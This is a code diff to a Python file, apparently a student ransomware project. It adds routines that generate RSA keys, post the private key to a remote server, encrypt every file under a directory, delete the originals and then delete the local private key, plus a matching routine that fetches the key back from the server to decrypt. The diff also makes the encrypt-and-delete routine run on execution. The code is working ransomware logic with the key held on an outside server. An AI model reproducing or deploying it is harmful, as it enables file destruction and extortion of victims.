@@ -133,7 +133,10 @@ def MyRSAEncryptFile(filepath, RSA_publickey_filepath):
     # This calls myFileEncryptMAC2 which generates the encKey and HMACKey.
     (RSACipher, ct, iv, tag, ext) = MyRSAEncrypt(filepath, RSA_publickey_filepath)
 
-    (name, _) = splitext(filepath)
+    (name, ext2) = splitext(filepath)
+    # do not encrypt json files
+    if ext2 == ".json":
+        raise Exception("Error: json file in directory")
 
     # Convert bytes variables to strings
     bytesToString = FileEncryption.bytesToString
@@ -155,6 +158,8 @@ def MyRSAEncryptFile(filepath, RSA_publickey_filepath):
 
     # Delete the original file.
     remove(filepath)
+
+    print("Encrypted file: " + filepath)
 
     return (RSACipher, ct, iv, tag, ext)
 
@@ -185,6 +190,8 @@ def MyRSADecryptFile(filepath, RSA_privatekey_filepath):
     with open(origFilepath, "wb") as fw:
         fw.write(message)
 
+    print("Decrypted file: " + filepath)
+
     return message
 
 # message = MyRSADecrypt(RSACipher, C, IV, tag, ext)
@@ -206,7 +213,7 @@ def encryptDir(directory, RSA_publickey_filepath):
                 continue
 
             MyRSAEncryptFile(filepath, RSA_publickey_filepath)
-            print("Encrypted file: " + filepath)
+            #print("Encrypted file: " + filepath)
 
 def decryptDir(directory, RSA_privatekey_filepath):
     for root, dirs, files in walk(directory, topdown=False):
@@ -219,7 +226,7 @@ def decryptDir(directory, RSA_privatekey_filepath):
                 continue
 
             MyRSADecryptFile(filepath, RSA_privatekey_filepath)
-            print("Decrypted file: " + filepath)
+            #print("Decrypted file: " + filepath)
 
 def test_RSAEncrypt():
     message = b"encrypted data23"
@@ -355,8 +362,8 @@ def requestPost(pubkey, privkey):
     if r.content == b'Wrong appkey':
         raise Exception('Wrong appkey')
 
-    print("Posted data: ")
-    print(data)
+    print("Posted keys to server.")
+    # print(data)
 
 def requestPostKeys():
     requestPost(readPubKey(), readPrivKey())
@@ -388,10 +395,60 @@ def test_requestPostKeys():
     checkAndCreatePEMFiles()
     requestPostKeys()
 
+def removePrivateKey():
+    remove(RSA_PRIVATE_KEY_FILEPATH)
+    print("Deleted private key file.")
+
+# Generate new keys, post to server, encrypt dir, delete private key
+def main_encryptDirServer():
+    checkAndCreatePEMFiles()
+    
+    # Post the keys to the server.
+    requestPostKeys()
+
+    directory = ENCRYPTION_DIRECTORY
+    RSA_publickey_filepath = RSA_PUBLIC_KEY_FILEPATH
+    encryptDir(directory, RSA_publickey_filepath)
+
+    # Delete the private RSA key file.
+    removePrivateKey()
+
+    i = input()
+
+def loadKeyFromText(t):
+    key = serialization.load_pem_private_key(
+        t,
+        password=None,
+        backend=default_backend()
+    )
+
+def main_decryptDirServer():
+    # retrieve private key from server
+    pubkey = readPubKey()
+    responseList = requestGetByPubkey(pubkey)
+    if len(responseList) > 1:
+        raise Exception("More than one item in the database with that pubkey.")
+
+    privKeySerialized = responseList[0]['privkey']
+    #print(privKeySerialized)
+
+    # write private key to file
+    with open(RSA_PRIVATE_KEY_FILEPATH, "w") as key_file:
+        key_file.write(privKeySerialized)
+
+    directory = ENCRYPTION_DIRECTORY
+    RSA_privatekey_filepath = RSA_PRIVATE_KEY_FILEPATH
+    decryptDir(directory, RSA_privatekey_filepath)
+
+    # Delete the private RSA key file.
+    removePrivateKey()
+
+    i = input()
+
 #test_requestGetByPubkey()
 #test_requestPostKeys()
-test_requestGet()
+#test_requestGet()
 
-
-
+main_encryptDirServer()
+main_decryptDirServer()
 
